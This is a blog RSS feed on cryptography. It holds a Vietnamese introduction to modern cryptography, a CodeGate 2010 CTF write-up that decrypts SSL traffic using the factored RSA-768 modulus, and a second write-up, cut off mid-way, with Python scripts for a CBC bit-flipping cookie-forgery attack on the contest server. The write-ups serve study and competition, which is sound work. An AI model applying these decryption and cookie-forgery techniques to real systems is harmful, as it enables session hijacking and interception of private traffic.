<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: Cryptography</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Mật mã hiện đại (1)</title>
  <link>http://realjenius.com/research/2011/01/14/crypto-1.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-01-14T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2011/01/14/crypto-1.html</guid>
  <description><![CDATA[
     <p>Tôi dự tính viết về đề tài này từ cả năm nay, mà mãi tới bây giờ mới có đủ động lực để viết. Có hai lý do khiến tôi bắt đầu.</p>

<p>Thứ nhất, số là tôi đang theo học một cách chính quy về mật mã, mà kinh nghiệm cho thấy cách học (và đọc sách) tốt nhất là viết, tóm tắt lại và giải thích rành mạch rõ ràng những gì vừa học được cho người khác. Chừng nào làm được như thế thì mới có thể xem là đã hiểu được vấn đề đang muốn học.</p>

<p>Thứ hai, hôm rồi tôi đọc một mẩu chuyện về Richard Feynman, trong đó có đoạn kể về lúc Feynman bị bệnh, gần đất xa trời, ông tâm sự rằng, “[I’m going to die but I’m not as sad as you think because] when you get as old as I am, you start to realize that <a href="http://www.longnow.org/essays/richard-feynman-connection-machine/">you’ve told most of the good stuff you know to other people anyway</a>“. Đương nhiên những gì tôi biết làm sao mà “good” bằng những gì Feynman biết, nhưng dẫu sao thì tôi cũng sẽ học theo Feynman, có biết cái gì hay ho thì giải thích cho nhiều người khác cùng biết.</p>

<h2 id="i-m-u">I. Mở đầu</h2>

<h3 id="gii-thiu">1. Giới thiệu</h3>

<p>Loạt bài này tôi sẽ giới thiệu về mật mã học hiện đại, tập trung vào giải thích cách thức hoạt động của các thành phần mật mã cơ sở (cryptographic primitive) và làm sao sử dụng chúng cho đúng cách.</p>

<p>Mật mã là công cụ rất mạnh mẽ làm nhiều người lầm tưởng rằng cứ sử dụng mật mã là an toàn, mà không biết rằng mật mã là con dao hai lưỡi. Bạn có thể xây dựng một hệ thống với đầy đủ các ý tưởng hay ho nhất của mật mã, nhưng nếu bạn không dùng mật mã đúng cách, hệ thống của bạn sẽ hoàn toàn thiếu an toàn.</p>

<p>Đã có rất nhiều ví dụ, mà tiêu biểu là các kết quả làm việc gần đây của tôi và đồng nghiệp (xem <a href="http://vnhacker.blogspot.com/2009/09/flickrs-api-signature-forgery.html">đây</a>, <a href="http://vnhacker.blogspot.com/2010/06/practical-padding-oracle-attacks.html">đây</a> và <a href="http://vnhacker.blogspot.com/2010/10/first-time-on-screen.html">đây</a>). Hoặc như gần đây, hệ thống bảo vệ máy PS3 của Sony bị phá vỡ hoàn toàn chỉ vì sử dụng sai mật mã. Không riêng gì Sony, mà rất nhiều hãng lớn trên thế giới, từ Oracle, Yahoo!, đến Microsoft, đã sử dụng sai mật mã và làm cho sản phẩm của họ thiếu an toàn.</p>

<p>Điều này cho thấy, chỉ biết mật mã giúp gì cho bạn là chưa đủ, mà bạn cần phải biết làm thế nào để sử dụng chúng đúng cách. Khi biết cách sử dụng đúng mật mã rồi, bạn sẽ có thể dùng mật mã để xây dựng các hệ thống an toàn hơn, và đồng thời có thể đánh giá được sản phẩm sử dụng mật mã của bên thứ ba.</p>

<p>Giáo trình mà tôi sử dụng là cuốn sách “<a href="http://www.amazon.com/Introduction-Modern-Cryptography-Principles-Protocols/dp/1584885513">Introduction To Modern Cryptography</a>” của Jonathan Katz và Yehuda Lindell (từ đây về sau gọi là KL). Trong quá trình học mật mã, tôi cũng đã đọc thử nhiều sách khác nhau, nhưng cuốn KL này là thích hợp hơn nhất cho việc tìm hiểu mật mã học hiện đại. KL cũng được sử dụng làm giáo trình để dạy mật mã cho cấp đại học và cao học ở nhiều trường đại học trên thế giới. Bạn nào có điều kiện thì nên mua sách. Nếu là sinh viên thì có thể liên hệ với tôi (ở TP.HCM) để mượn sách mà đọc.</p>

<p>Một cuốn sách miễn phí khác có thể dùng để thay thế KL là cuốn Handbook of Applied Cryptography. Kết thúc mỗi bài viết, tôi sẽ liệt kê trang nào trong KL hoặc HAC cần phải đọc.</p>

<p>Loạt bài được chia làm ba phần lớn. Phần đầu tiên nói về mã đối xứng, phần thứ hai nói về mã bất đối xứng, và phần thứ ba sẽ bàn về các đề tài nâng cao. Trong phần thứ nhất tôi sẽ giải quyết vấn đề: làm thế nào để chị A và anh B liên lạc với nhau an toàn, khi hai người đã có một khóa bí mật chung? Vấn đề của phần thứ hai sẽ là làm thế nào để chị A và anh B chưa quen biết nhau có thể tạo ra một khóa bí mật chung chỉ có hai anh chị biết mà thôi? Trong phần thứ ba, tùy vào tình hình mà tôi sẽ viết về các đề tài như tiền điện tử, bầu cử điện tử hay đấu giá điện tử.</p>

<p>Tôi cũng muốn lưu ý là nội dung loạt bài sẽ có những phần không nằm trong cuốn KL, và tôi sẽ cố gắng để người đọc hiểu được loạt bài này mà không cần phải tham khảo thêm tài liệu khác. Nghĩa là khi nào cần thì tôi sẽ cung cấp các kiến thức hỗ trợ, ví dụ như các kiến thức toán (bao gồm lý thuyết xác suất, lý thuyết số, đại số trừu tượng và một ít lý thuyết độ phức tạp tính toán). Tôi cũng không chắc là tôi làm được (tự vì tôi cũng đang học như bạn mà thôi!), nhưng mà tôi sẽ cố gắng. Mục tiêu của tôi là nếu bạn theo sát loạt bài viết này từ đầu, thì khi kết thúc, bạn sẽ hiểu mật mã học hiện đại hoạt động ra sao, và cách sử dụng chúng như thế nào cho đúng và an toàn.</p>

<h3 id="ti-sao-mt-m">2. Tại sao mật mã?</h3>

<p>Trước khi đi vào nội dung chính của bài viết đầu tiên, tôi muốn dành ra ít phút để thuyết phục bạn là tại sao chúng ta cần phải học mật mã. Cá nhân tôi thấy có ba lý do chính.</p>

<p>Thứ nhất, mật mã là công cụ rất quan trọng, được sử dụng ở mọi nơi. Tôi đồ rằng nhiều bạn dùng mật mã hàng ngày mà lại không biết. Bạn có dùng GMail hoặc có bao giờ mua hàng trên Amazon không? Nếu có thì bạn đã dùng mật mã rồi đó.</p>

<p>Bạn có chú ý là khi bạn vào GMail hoặc Amazon, địa chỉ mà bạn sử dụng bắt đầu bằng HTTPS thay vì HTTP không? Chữ S trong HTTPS là viết tắt của Secure, hiểu nôm na rằng HTTPS là phiên bản an toàn hơn so với HTTP, và sự an toàn này là nhờ vào bộ giao thức mật mã mang tên Secure Socket Layer, phiên bản mới hơn gọi là Transport Layer Security. Nhờ có SSL/TLS mà bạn có thể an tâm giao dịch với Amazon mà không sợ thông tin giao dịch của bạn bị đánh cắp hoặc chỉnh sửa trong quá trình truyền từ máy tính của bạn lên đến máy chủ của Amazon. Nói cách khác, không có mật mã thì đã không có thương mại điện tử rồi!</p>

<p>SSL/TLS được dùng chủ yếu để bảo vệ thế giới web, mà Internet thì đâu chỉ có web. Mật mã còn có thể được sử dụng để đảm bảo an toàn cho email. Email có hai vấn đề cần phải giải quyết. Thứ nhất, làm thế nào để đảm bảo tính riêng tư, tỉ như chị A viết thư cho anh B, thì chỉ có anh B đọc được thư đó thôi, không ai khác đọc được cả. Thứ hai, làm thế nào để hiện thực hóa vấn đề chữ ký trong thư từ thông thường, nói cách khác làm sao để anh B biết chắc là thư đang đọc đến từ chị A, không bị ai sửa chữa giả mạo gì cả, và sau này chị A cũng không thể chối là chị không phải là tác giả của lá thư đó? Đây chính là yêu cầu bắt buộc của khái niệm chữ ký điện tử mà chúng ta thường nghe. Tương tự như SSL/TLS, PGP/OpenPGP là tiêu chuẩn phổ biến nhất để bảo vệ email thông qua các thành tựu của mật mã học.</p>

<p>Nếu bạn là lập trình viên, thì chắc chắn sẽ có lúc nào đó bạn gặp phải vấn đề xác thực người dùng, và lúc đó bạn sẽ cần phải sử dụng mật mã để xây dựng nên một cơ chế quản lý mật khẩu và xác thực người dùng một cách an toàn. Thay vì lưu mật mã trực tiếp xuống cơ sở dữ liệu, nhiều lập trình viên đã biết sử dụng các thuật toán băm một chiều để bảo vệ mật khẩu. Tuy vậy phần lớn trong số đó vẫn sử dụng sai mật mã, khiến cho mặc dù có dùng mật mã, nhưng hệ thống của họ vẫn không an toàn hơn là mấy. Thí dụ như nếu bạn chỉ băm mật khẩu xuyên qua MD5 một lần, thì bạn đã làm sai! Cách làm đúng là phải băm ít nhất 1000 lần, và còn nhiều tiểu tiết khác nữa!</p>

<p>Người ta còn dùng mật mã để bảo vệ các giao thức mạng không dây. Thầy tôi thường nói ông phải cảm ơn những người đã thiết kế ra tiêu chuẩn 802.11i, còn được biết đến là WEP, bởi WEP đã phạm phải mọi sai lầm từng được biết đến trong các sách giáo khoa về mật mã, nên mỗi lần cần đưa ra ví dụ về cách sử dụng sai mật mã, thầy tôi chỉ việc lấy một ví dụ từ WEP! Ông gọi WEP là một giao thức được “thiết kế sau những cánh cửa đóng”, đi ngược lại hoàn toàn với tiêu chí mở trong mã hóa (tôi sẽ nói thêm về tiêu chí mở này ở bên dưới). Trong loạt bài này, bạn sẽ thấy ngoài WEP ra còn có rất nhiều giao thức, thuật toán mã hóa được “thiết kế sau những cánh cửa đóng”, và tất cả đều không an toàn.</p>

<p>Ngoài những ứng dụng trực tiếp kể trên ra, mật mã còn được sử dụng trong nhiều lĩnh vực có vẻ không liên quan mấy, ví dụ như bầu cử, đấu giá, tiền điện tử hay bảo vệ bản quyền điện tử. Đây là những chủ đề mà bản thân tôi chưa có cơ hội tìm hiểu; dẫu vậy tôi có kế hoạch sẽ tìm hiểu chúng trong tương lai gần. Tóm lại, lý do thứ nhất cần phải học mật mã là vì mật mã rất mạnh mẽ và có thể giúp chúng ta giải quyết nhiều vấn đề tự nhiên đến từ cuộc sống.</p>

<p>Thứ hai, mật mã rất đẹp, đơn giản vì nó là sự giao thoa và ứng dụng của rất nhiều nhánh trong toán học, mà toán đẹp cỡ nào thì khỏi phải bàn rồi phải không? ;-).</p>

<p><a href="http://tuanvanle.wordpress.com/2010/12/16/%E1%BB%A9ng-d%E1%BB%A5ng-toan-h%E1%BB%8Dc-%E2%80%93-%E2%80%9Cm%E1%BA%A3nh-d%E1%BA%A5t-h%E1%BB%A9a%E2%80%9D-d%E1%BA%A7y-chong-gai/">Giáo sư Phạm Huy Điển từng viết rất hay như thế này</a>:</p>

<blockquote>
  <p>Lâu nay không ít người cảm thấy thất vọng vì đã “uổng công” học Toán. Nghe người ta nói thì Toán học là “chìa khóa” cho mọi vấn đề, nhưng trên thực tế thì học sinh sau khi tốt nghiệp lại chẳng biết dùng kiến thức Toán đã học được trong nhà trường vào việc gì trong cuộc sống, nhất là những bài toán khó mà họ đã tốn bao công sức nhồi nhét trong các “lò luyện” đủ loại. Đây là một thực tế, xuất phát từ việc xác định nội dung và phương pháp dạy Toán không hợp lý trong các nhà trường hiện nay. Toán học đã bị biến thành một môn “đánh đố thuần túy”, thay vì một bộ môn khoa học mang đầy chất thực tiễn. Tuy nhiên, còn một lý do khác khiến chúng ta không nhìn thấy được bóng dáng của Toán học trong thực tiễn thường ngày, đó là Toán học ngày nay không mấy khi trực tiếp đi được vào các ứng dụng trong thực tiễn mà thường phải “ẩn” sau các ngành khoa học khác: Sinh học, Môi trường, Tài chính, Kinh tế… và thậm chí ngay cả Công nghệ thông tin, một lĩnh vực có thể xem như là được sinh ra từ Toán học. Đã có những ý kiến nói về sự lãng phí của nguồn nhân lực đang làm Toán hiện nay và không ít người cũng đã tưởng là thật…</p>

  <p>May mắn thay, khoa học Mật mã đã góp một phần quan trọng trong việc làm sáng tỏ cái “sự thật oan trái” này. Có thể nói rằng hiếm có lĩnh vực nào mà vai trò của các công cụ Toán học lại được thể hiện rõ ràng đến như vậy. Chính Toán học đã làm nên cuộc cách mạng trong công nghệ mật mã, trước hết là bằng sự hiện thực hóa các ý tưởng về mật mã khóa công khai mà các nhà mật mã chuyên nghiệp đã ấp ủ từ lâu, và sau đó là đưa một số kết quả của Toán học (thuộc loại trừu tượng vào bậc nhất) tiếp cận với các ứng dụng trong thực tiễn.</p>
</blockquote>

<p>Bạn nào hồi phổ thông có học chuyên toán chắc hẳn sẽ nhớ đến định lý nhỏ (rất đẹp!) của Fermat phát biểu rằng: nếu $latex {p}$ là số nguyên tố, thì ta có: $latex forall a in mathbb{Z}, a^p equiv a , (mod , p)$. Khi học mật mã, bạn sẽ thấy lại định lý này và nhiều ứng dụng tuyệt vời của nó! Tôi có thể bật mí sơ là hệ mã nổi tiếng RSA được xây dựng dựa trên kết quả của định lý đơn giản này!&lt;/span&gt;&lt;/span&gt;</p>

<p>Ngoài toán ra, mật mã học hiện đại còn được xây dựng dựa trên lý thuyết trung tâm của khoa học máy tính: lý thuyết độ phức tạp tính toán (mà thiệt ra cũng là toán thôi). Thành ra đối với những người học khoa học máy tính hoặc nói đơn giản là làm IT như chúng ta, tìm hiểu về mật mã là một cách để thưởng thức cái đẹp của khoa học máy tính.</p>

<p>Bạn nào học lý thuyết độ phức tạp tính toán rồi thì đều biết là có những bài toán mà chúng ta chưa biết khó cỡ nào, chỉ biết là sao bao nhiêu năm nghiên cứu, thế giới vẫn chưa tìm ra thuật toán “hiệu quả” để giải. Câu hỏi là có cách nào lợi dụng những bài toán khó đó để phục vụ cho lợi ích của con người? Nghe có vẻ hơi ngược đời đúng không, chưa tìm ra lời giải thì làm sao mà lợi với chả dụng? Thế mà những người tiên phong của mật mã hiện đại đã nghĩ ra cách sử dụng các bài toán khó như thế và chính những ứng dụng độc đáo sáng tạo như thế này làm nên vẻ đẹp của mật mã!</p>

<p>Lý do thứ ba? Tự bảo vệ những quyền con người cơ bản của chính chúng ta!</p>

<p>Ai cũng có quyền có bí mật, và ai cũng có quyền quyết định khi nào và như thế nào họ sẽ tiết lộ bí mật đó cho người khác. Chúng ta kết nối vào Internet để gửi email, đọc blog, mua một món hàng hay công bố một bài viết mới; mỗi một hành động như thế đều có thể được diễn dịch theo nhiều ngữ nghĩa khác nhau, mà mỗi cách diễn dịch đôi khi lại đem đến những thiệt hại không mong muốn cho chính chúng ta. Thành ra cách tốt nhất là hạn chế tiết lộ danh tính, và nếu ẩn danh được thì càng tốt (cá nhân tôi cho rằng, sở dĩ Internet phát triển như ngày nay một phần là vì bản chất ẩn danh của nó, dẫu đây chỉ là một sự ngộ nhận). Hơn nữa, không phải cái gì chúng ta nói, chúng ta viết đều là dành cho tất cả mọi người; đôi khi chúng ta muốn chỉ duy nhất một nhóm vài người có thể đọc và nghe được những ý kiến của chúng ta. Đây là quyền riêng tư. Mời bạn đọc thêm <a href="http://www.activism.net/cypherpunk/manifesto.html">A Cypherpunk’s Manifesto</a>.</p>

<p>Ai cũng có quyền tự do ngôn luận, tự do thể hiện, tự do tí toáy, ở ngoài đời thật hoặc ở trên Internet. Chắc hắn không cần phải giải thích, tất cả chúng ta đều biết những quyền này quan trọng như thế nào đối với sự tự do của mỗi cá nhân. Vậy ai muốn xâm hại những quyền con người cơ bản của chúng ta? Tôi nghĩ câu hỏi này là thừa, bởi vì rõ ràng sự tự do của tất cả chúng ta đã, đang và bị xâm hại. Khi bạn không kết nối vào được Facebook, nghĩa là bạn đã không còn được tự do.</p>

<p>May mắn thay, những thành tựu trong vài chục năm vừa qua của mật mã có thể phần nào giúp tất cả chúng ta đảm bảo được tính riêng tư và sự tự do trong cuộc sống hàng ngày. Tôi hi vọng là qua loạt bài viết này, tất cả các bạn sẽ hiểu được sức mạnh của mật mã, rồi từ đó sử dụng chúng đúng cách để bảo vệ những quyền và lợi ích chính đáng của bản thân.</p>

<h3 id="nguyn-l-kerckhoff">3. Nguyên lý Kerckhoff</h3>

<p>Nguyên lý do ông Kerckhoff phát biểu vào thế kỷ 19 với nội dung như sau:</p>

<blockquote>
  <p>Một hệ thống mã hóa phải an toàn ngay cả khi tất cả thông tin về hệ thống đó đều đã được công bố ra ngoài. Bí mật duy nhất của hệ thống là một khóa ngắn.</p>
</blockquote>

<p>Thực tế cho thấy tất cả các công nghệ mã hóa “thiết kế sau những cánh cửa đóng” đều bị phá vỡ nhanh chóng ngay khi một ai đó “reverse engineer” và công bố thiết kế của chúng. RC4 (dùng để mã hóa mạng không dây), A5/1 (dùng để mã hóa mạng điện thoại GSM), CSS (dùng để mã hóa đĩa DVD), Crypto-1 (dùng để mã hóa các thẻ thanh toán điện tử)… tất cả đều bị phá vỡ trong một thời gian ngắn, kể từ lúc thuật toán bị “reverse engineer”.</p>

<p>Thành ra khi sử dụng mật mã, chúng ta sẽ tuyệt đối tuân thủ nguyên lý Kerckhoff này. Nói cách khác, chúng ta chỉ sử dụng những thuật toán, tiêu chuẩn, hệ thống mã hóa mở. May mắn là đã có sẵn rất nhiều thuật toán, tiêu chuẩn và hệ thống mã hóa mở, chúng ta chỉ việc chọn cái thích hợp mà dùng, không cần phải xây dựng lại từ đầu. Tuyệt đối không sử dụng những tiểu chuẩn, thuật toán, hệ thống đóng! Nói cách khác, avoid security through obscurity.</p>

<p>Mật mã là sân chơi của những ông già bảo thủ ;-), những người luôn đặt ra những điều kiện khó nhất, và rồi cố gắng xây dựng một hệ thống an toàn trong những điều kiện đó. Điều thú vị là họ thành công!</p>


  ]]></description>
</item>

	<item>
  <title>CodeGate 2010 &#8211; Challenge 7: Weak SSL Cracking</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge7-weak-ssl-cracking.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-23T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge7-weak-ssl-cracking.html</guid>
  <description><![CDATA[
     <p>Writeup for CodeGate 2010 – Challenge 7 by <a href="http://namnham.blogspot.com/" target="_blank">namnx</a></p>

<hr />

<div style="text-align: justify">
  Last weekend, I had a great hacking time with team <a href="http://www.vnsecurity.net/about-us/clgt-ctf-team/">CLGT</a> in the <a href="http://ctf.codegate.org/">CodeGate 2010 CTF</a> Preliminary Round. It lasted 36 consecutive hours from 7:00AM March 13 to 7:00PM March 14. There were a lot of teams around the world participating in this hacking contest. And excellently, CLGT proved it as one of the best teams when got the 2nd place in this round. See <a href="http://beist.org/CG2010_rank.png">final ranking</a>.
</div>

<div style="text-align: justify">
  This entry is my writeup for challenge 7. I think this is an interesting challenge from which you can learn more deeply about SSL protocol and public key cryptography. In this challenge, we were provided a tcpdump file of a SSL traffic and a hint &#8220;<em>does the modulus look familiar?</em>&#8220;. So our goal is to analyze and decrypt this captured traffic to get the flag.
</div>

<p><strong><span style="font-family: Georgia,'Times New Roman',serif">Analysis</span></strong><br />
Firstly, I used Wireshark to load this file and start to analyze it:</p>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh3.ggpht.com/_BaefoYBtOwQ/S59Mv6OohsI/AAAAAAAAAW4/z7INUja_DtE/challenge7-1.png"><img src="http://lh3.ggpht.com/_BaefoYBtOwQ/S59Mv6OohsI/AAAAAAAAAW4/z7INUja_DtE/challenge7-1.png" border="0" alt="" width="500" height="271" /></a>
</div>

<div style="text-align: justify">
  There are 26 packets captured. Packet #4 is a <strong><em>SSL Client Hello</em></strong> packet, but after it, packet #8 and packet #9 have FIN flag. This mean that the session was termininated. So we just ignore them.
</div>

<div style="text-align: justify">
  Packet #14 is another <strong><em>SSL Client Hello</em></strong> packet. This is where the real session began. Take a look into it:
</div>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh4.ggpht.com/_BaefoYBtOwQ/S59PftmaEmI/AAAAAAAAAXA/yxCqiOSmyHA/challenge7-2.png"><img src="http://lh4.ggpht.com/_BaefoYBtOwQ/S59PftmaEmI/AAAAAAAAAXA/yxCqiOSmyHA/challenge7-2.png" border="0" alt="" width="500" height="274" /></a>
</div>

<div style="text-align: justify">
  There is nothing special. It is just a normal <strong><em>SSL Client Hello</em></strong> packet. It happens when a client want to connect to a SSL service. We continue look into the packet #16, the <strong><em>SSL Server Hello</em></strong> packet:
</div>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh6.ggpht.com/_BaefoYBtOwQ/S59SI8VjnhI/AAAAAAAAAXI/LGU0BQZP4x0/s1600/challenge7-3.png"><img src="http://lh6.ggpht.com/_BaefoYBtOwQ/S59SI8VjnhI/AAAAAAAAAXI/LGU0BQZP4x0/s400/challenge7-3.png" border="0" alt="" width="501" height="324" /></a>
</div>

<div style="clear: both;text-align: left">
  This is the response for SSL Client Hello packet. We can see some useful information here:
</div>

<div style="clear: both;text-align: left">
  - The cipher suite will be used: <strong>RSA_WITH_AES_256_CBC_SHA</strong>
</div>

<div style="clear: both;text-align: left">
  - The X509 certificate of the server
</div>

<div style="clear: both;text-align: justify">
  In the SSL protocol, the server send its certificate to the client in the handshaking process. This certificate will be used for supporting the key exchange afterward. The certificate contains the server&#8217;s public key and other data. By extracting the public key and recovering the private key from it, we can decrypt the SSL traffic.
</div>

<div style="clear: both;text-align: justify">
  <strong><span style="font-family: Georgia,'Times New Roman',serif">Exploit</span></strong>
</div>

<div style="clear: both;text-align: justify">
  I wrote some Python code to exploit this challange:
</div>

<pre class="brush: python; title: ; notranslate" title="">from scapy.all import *
    from M2Crypto import X509

    def decode_serverhello(packet):
    payload = packet.load
    cert = payload[94:1141]
    cert = X509.load_cert_string(cert, 0)
    return cert

    def get_pubkey(cert):
    pubkey = cert.get_pubkey().get_rsa()
    n = long(pubkey.n.encode('hex')[8:], 16)
    e = long(pubkey.e.encode('hex')[9:], 16)
    return n, e

    packets = rdpcap('ssl.pcap')
    cert = decode_serverhello(packets[15])
    n,e = get_pubkey(cert)
</pre>

<p>Because this traffic used RSA as public key algorithm, the public key contains 2 components: <strong>n</strong> and <strong>e</strong>. We get their values from the above code:</p>

<pre class="brush: python; title: ; notranslate" title="">n = 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
    e = 65537
</pre>

<div style="text-align: justify">
  In RSA, <strong>n</strong> is the product of 2 big prime numbers <strong>p</strong> and <strong>q</strong>. So, in order to recover the RSA private key from the public key, we must factorize <strong>n</strong> into <strong>p</strong> and <strong>q</strong>. This is the key point of the challenge. In this situation, n is a very big number (232 decimal digits). How can we do that? In the beginning, I didn&#8217;t know how to solve it. But I remembered the hint &#8220;<em>does the modulus look familiar?</em>&#8220;. So I tried <a href="http://bit.ly/azg7Vh">googling it</a> <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":-D" class="wp-smiley" /> (actually just its last digits). And&#8230; oh my god, I was lucky! It is <a href="http://en.wikipedia.org/wiki/RSA_numbers#RSA-768">RSA-768</a>. It&#8217;s factorized just few months ago.
</div>

<pre class="brush: python; title: ; notranslate" title="">RSA-768 = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
    × 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
</pre>

<p>So now, we have all components of the RSA keys.</p>

<pre class="brush: python; title: ; notranslate" title="">n = 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
    e = 65537
    p = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
    q = 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
    d = 703813872109751212728960868893055483396831478279095442779477323396386489876250832944220079595968592852532432488202250497425262918616760886811596907743384527001944888359578241816763079495533278518938372814827410628647251148091159553
</pre>

<div style="text-align: justify">
  The last thing we have to do is generating the RSA private key in PEM format from these components. But how can we do that? As far as I know, popular cryptographic libraries like OpenSSL do not support this. So in this case, I wrote my own tool to do this task. It is based on ASN1. It is a little long to post here. But if you want to write your own one, I recommend <a href="http://pyasn1.sourceforge.net/">pyasn1</a>.
</div>

<p>After having the private key, just import it to Wireshark to decrypt the SSL traffic:</p>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh6.ggpht.com/_BaefoYBtOwQ/S59zDsyIwPI/AAAAAAAAAXQ/dMd2XsmITRo/s1600/challenge7-4.png"><img src="http://lh6.ggpht.com/_BaefoYBtOwQ/S59zDsyIwPI/AAAAAAAAAXQ/dMd2XsmITRo/s400/challenge7-4.png" border="0" alt="" width="501" height="178" /></a>
</div>

<p><strong>References</strong><br />
- SSL/TLS: http://en.wikipedia.org/wiki/Transport_Layer_Security<br />
- RSA: http://en.wikipedia.org/wiki/RSA</p>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2010 &#8211; Challenge 8: Bit-flipping attack on CBC mode</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge-8-bit-flipping-attack-on-cbc-mode.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-23T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge-8-bit-flipping-attack-on-cbc-mode.html</guid>
  <description><![CDATA[
     <p>Writeup for CodeGate 2010 Challenge 8 by <a href="http://namnham.blogspot.com/" target="_blank">namnx</a></p>

<hr />

<p>This is a web-based cryptography challenge. In this challenge, we were provided a URL and a hint “<em>the first part is just an IV</em>“.</p>

<p>The URL is: <a href="http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php">http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php</a>.</p>

<h3 id="analysis">Analysis</h3>

<p>Go to the challenge URL. It will ask you the username for the first time. After we enter a value, for example ‘<span style="font-family: 'Courier New',Courier,monospace">namnx</span>‘, it will return only a single message “<span style="font-family: 'Courier New',Courier,monospace">Hello, namnx!</span>“. Examine the HTTP payload, we will see the cookie returned:</p>

<blockquote>
  <table>
    <tbody>
      <tr>
        <td>web4_auth=1vf2EJ15hKzkIxqB27w0AA==</td>
        <td>5X5A0e3r48gXhUXZHEKBa5dpC+XfdVv4oamlriyi5yM=</td>
      </tr>
    </tbody>
  </table>
</blockquote>

<table>
  <tbody>
    <tr>
      <td>The cookie includes 2 parts delimited by character ‘</td>
      <td>’. After base64 decode the first part of the cookie, we have a 16-byte value. According to the hint, this is the IV of the cipher. And because it has 16-byte length, I guess that this challenge used AES cipher, and the block size is 16 bytes. Moreover, the cipher has an IV, so it can’t be in ECB mode. I guessed it in CBC mode. The last part is the base64 of a 32-byte value. This is a cipher text. We will exploit this value later.</td>
    </tr>
  </tbody>
</table>

<p>Browse the URL again, we will receive another message: “<em>Welcome back, namnx! Your role is: user. You need admin role.</em>” Take a look into this message, we can guess the operation of this app: it will receive the cookie from the client, decrypt it to get the user and role information and return the message to the client based on the user and role information. So, in order to get further information, we must have the admin role. This is our goal in this challenge.<strong><span style="font-family: Georgia,'Times New Roman',serif"> </span></strong></p>

<h3 id="exploit">Exploit</h3>

<p>I wrote some Python to work on this challenge easier:</p>

<pre class="brush: python; title: ; notranslate" title="">import urllib, urllib2
    import base64, re

    url = 'http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php'
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'

    def get_cookie(user):
        headers = { 'User-Agent' : user_agent}
        values = {'username' : user, 'submit' : "Submit"}
        data = urllib.urlencode(values)
        request = urllib2.Request(url, data, headers)
        response = urllib2.urlopen(request)
        cookie = response.info().get('Set-Cookie')
        groups = re.match("web4_auth=(.+)|(.+);.+", cookie).groups()
        iv = base64.b64decode(groups[0])
        cipher = base64.b64decode(groups[1])
        return iv, cipher

    def get_message(iv, cipher):
        cookie = base64.b64encode(iv) + '|' + base64.b64encode(cipher)
        cookie = urllib.quote(cookie)
        cookie = 'web4_auth=' + cookie
        headers = { 'User-Agent' : user_agent, 'Cookie': cookie}
        request = urllib2.Request(url, None, headers)
        response = urllib2.urlopen(request)
        data = response.read()
        print repr(data)
        groups = re.match(".+, (.*)! .+: (.*). You.+", data).groups()
        return groups[0], groups[1]
</pre>

<p>The first function, get_cookie will submit a value as a username in the first visit to the page, get the returned cookie, and then parse it to get the IV and cipher. The second function, get_message, do the task like when you visit the page in later times, it parses the response message to get the returned username and role.</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('123456789012')
    &gt;&gt;&gt; len(cipher)
    32
    &gt;&gt;&gt; iv, cipher = get_cookie('1234567890123')
    &gt;&gt;&gt; len(cipher)
    48
</pre>

<p>When you input the user with a 12-byte value, the returned cipher will have 32 bytes (2 blocks). And when you enter a 13-byte value, the cipher will have 48 bytes (3 blocks). This means that beside the username value, the plain text of the cipher will be added more 20 bytes.</p>

<p>Try altering the cipher text to see how it is decrypted:</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('1234567890')
    &gt;&gt;&gt; cipher1 = cipher[:-1] + '&#092;&#048;0'
    &gt;&gt;&gt; username, role = get_message(iv, cipher1)
    'Welcome back, 1234567xa2xc2xcaxfeixdbxee_cxa7xd7x0cxa9jxe0xbb! Your role is: . You need admin role.'
</pre>

<p>As you can see, the last block of the decrypted role is the first block of the plain text. So, the format of the plain text may be: ‘username=’ + username + [11 bytes].</p>

<p>To here, we can guess that the format of the plain text can be something like:</p>

<blockquote>
  <p>‘username=’ + username + [delimiter] + [param] + ‘=’ + [value]</p>
</blockquote>

<p>The last 11 bytes of the plain text can be determined by the code below:</p>

